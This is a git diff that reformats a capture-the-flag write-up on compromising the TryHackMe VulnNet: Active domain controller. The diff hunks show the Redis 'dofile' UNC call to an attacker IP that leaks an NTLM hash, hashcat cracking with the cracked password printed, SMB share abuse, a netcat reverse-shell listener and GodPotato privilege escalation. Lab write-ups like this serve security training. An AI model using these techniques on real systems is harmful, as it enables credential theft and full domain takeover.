@@ -2,15 +2,15 @@
 
 ## Overview
 
-Full compromise of the TryHackMe VulnNet: Active domain controller by identifying unauthenticated Redis on port 6379 with `nmap`, abusing `redis-cli` to force a UNC path lookup that leaks the `enterprise-security` Net-NTLMv2 hash to `Responder`, cracking it offline with `hashcat`, enumerating SMB via `smbclient` to find a writable `Enterprise-Share` hosting a scheduled PowerShell script, replacing it with a reverse shell payload caught in `netcat`, and escalating `SeImpersonatePrivilege` to `NT AUTHORITY\SYSTEM` with `GodPotato`.
+Full compromise of the TryHackMe VulnNet: Active domain controller by identifying unauthenticated **Redis on port 6379** with nmap, abusing redis-cli to force a UNC path lookup that leaks the enterprise-security **Net-NTLMv2 hash** to Responder, cracking it offline with hashcat, enumerating SMB via smbclient to find a writable Enterprise-Share hosting a scheduled PowerShell script, replacing it with a reverse shell payload caught in netcat, and escalating **SeImpersonatePrivilege** to **NT AUTHORITY\SYSTEM** with **GodPotato**.
 
-**Target:** `10.67.191.253` (Windows domain controller — vulnnet.local, TryHackMe)
+**Target:** **10.67.191.253** (Windows domain controller, vulnnet.local, TryHackMe)
 
 ---
 
 ## 1. Network Enumeration
 
-Full `nmap` port scan with service detection identified the target as a Windows Active Directory domain controller.
+Full nmap port scan with service detection identified the target as a Windows Active Directory domain controller.
 
 ```bash
 sudo nmap -sV -sC -p- 10.67.191.253
@@ -43,7 +43,7 @@ info
 
 <img src="02_redis_info.png" width="800">
 
-Redis was running as the user `enterprise-security` with no authentication configured.
+Redis was running as the user **enterprise-security** with no authentication configured.
 
 ```bash
 config get *
@@ -53,7 +53,7 @@ config get *
 
 Key finding from config:
 
-- Redis running from `C:\Users\enterprise-security\Downloads\Redis-x64-2.8.2402`
+- Redis running from C:\Users\enterprise-security\Downloads\Redis-x64-2.8.2402
 
 ---
 
@@ -73,7 +73,7 @@ eval "dofile('//192.168.203.76/share')" 0
 
 <img src="05_responder_hash.png" width="800">
 
-Responder captured the Net-NTLMv2 hash for `VULNNET\enterprise-security`.
+Responder captured the Net-NTLMv2 hash for **VULNNET\enterprise-security**.
 
 ---
 
@@ -87,7 +87,7 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
 <img src="06_hash_cracked.png" width="800">
 
-**Result:** `enterprise-security:sand_0873959498`
+**Result:** **enterprise-security:sand_0873959498**
 
 ---
 
@@ -101,13 +101,13 @@ smbclient -L \\\\10.67.191.253\\ -U enterprise-security
 
 <img src="07_smb_shares.png" width="800">
 
-Six shares identified. `Enterprise-Share` was non-standard and investigated further.
+Six shares identified. **Enterprise-Share** was non-standard and investigated further.
 
 ---
 
 ## 6. Writable Share and Scheduled Script Abuse
 
-The `Enterprise-Share` contained a PowerShell script being run on a schedule. Write access to the share was confirmed.
+The Enterprise-Share contained a PowerShell script being run on a schedule. Write access to the share was confirmed.
 
 ```bash
 smbclient \\\\10.67.191.253\\Enterprise-Share -U enterprise-security -t 120
@@ -115,7 +115,7 @@ smbclient \\\\10.67.191.253\\Enterprise-Share -U enterprise-security -t 120
 
 <img src="08_smb_enterprise_share.png" width="800">
 
-The original script `PurgeIrrelevantData_1826.ps1` contained:
+The original script *PurgeIrrelevantData_1826.ps1* contained:
 
 ```powershell
 rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
@@ -135,7 +135,7 @@ nc -lvnp 4444
 
 <img src="09_reverse_shell.png" width="800">
 
-Shell obtained as `vulnnet\enterprise-security`.
+Shell obtained as **vulnnet\enterprise-security**.
 
 ---
 
@@ -147,7 +147,7 @@ Shell obtained as `vulnnet\enterprise-security`.
 
 ## 9. Privilege Escalation via GodPotato
 
-`whoami /priv` revealed `SeImpersonatePrivilege` was enabled — a reliable path to SYSTEM.
+Running whoami /priv revealed **SeImpersonatePrivilege** was enabled, a reliable path to SYSTEM.
 
 GodPotato was uploaded to the share and copied to the target, then executed to run commands as SYSTEM.
 
@@ -161,7 +161,7 @@ C:\Users\enterprise-security\Downloads\GodPotato-NET4.exe -cmd "cmd /c whoami"
 
 <img src="11_godpotato_system.png" width="800">
 
-`NT AUTHORITY\SYSTEM` confirmed.
+**NT AUTHORITY\SYSTEM** confirmed.
 
 ---
 
